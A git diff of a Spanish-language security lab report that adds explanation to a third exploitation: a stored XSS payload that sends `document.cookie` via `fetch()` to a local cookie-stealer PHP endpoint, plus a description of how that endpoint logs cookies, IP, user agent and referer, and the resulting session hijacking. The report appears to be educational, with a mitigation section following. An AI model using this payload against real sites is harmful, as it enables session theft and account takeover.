@@ -139,9 +139,19 @@ A continuación se muestra la explotación 3.
 
 - Si un atacante consigue acceder a estas cookies, podría suplantar la identidad del usuario sin necesidad de conocer su contraseña.
 
+**Funcionamiento general del ataque**
+
+El ataque de robo de cookies mediante XSS se basa en los siguientes pasos:
+
+1. **Existencia de una vulnerabilidad XSS**. La aplicación permite introducir código JavaScript dentro de un comentario.
+2. **Inyección del script malicioso**. El atacante introduce un script que accede a las cookies mediante JavaScript.
+3. **Ejecución en el navegador de la víctima**. Cuando otro usuario visita la página, el navegador ejecuta el script.
+4. **Envío de las cookies al servidor atacante**. El script envía las cookies al servidor controlado por el atacante.
 
 
 ![XPLOIT3](./images/apartado_dos/xploit3.png)
+
+
 
 **`./www/cookieStealer/index.php`**
 
@@ -182,13 +192,58 @@ fclose($file);
 echo json_encode(["status" => 200]);
 ?>
 ```
+**Payload utilizado**
+
 ```html
 <script>
 fetch("http://localhost/cookieStealer/index.php?cookie=" + document.cookie);
 </script>
 <h2 style="color:red;">Explotación 3</h2>
-
 ```
+
+**Explicación**
+
+Este código realiza dos acciones principales:  
+
+1. Obtiene las cookies del navegador.
+
+Acceso a las cookies del navegador, la propiedad `document.cookie` permite acceder a todas las cookies asociadas al sitio web.
+
+3. Las envía al servidor atacante.
+
+La función `fetch()` realiza una petición HTTP al servidor del atacante.
+
+**Servidor atacante (Cookie Stealer)**
+
+El servidor atacante recibe la cookie y la guarda en un archivo.
+
+`$cookie = isset($_GET['cookie']) ? $_GET['cookie'] : 'No Cookie Provided';`
+
+Este código obtiene el valor de la cookie enviado en la URL, y posteriormente se registra en el archivo `cookies.txt`.
+
+Ejemplo de registro generado:
+
+![COOKIE](./images/apartado_dos/cookie.png)
+
+Además de la cookie, el script también guarda:
+
+- Dirección IP del usuario
+- Navegador utilizado (User Agent)
+- Página desde la que se ejecutó el ataque (Referer)
+
+Esto permite al atacante recopilar información adicional sobre la víctima.
+
+**Impacto**  
+
+Una vez que el atacante obtiene la cookie de sesión puede realizar **Session Hijacking** (secuestro de sesión).
+
+Esto significa que puede:
+
+- Acceder a la cuenta del usuario.
+- Realizar acciones en su nombre.
+- Acceder a información privada.
+- Modificar datos del sistema.
+
 ---
 
 ## 2.2 Mitigación
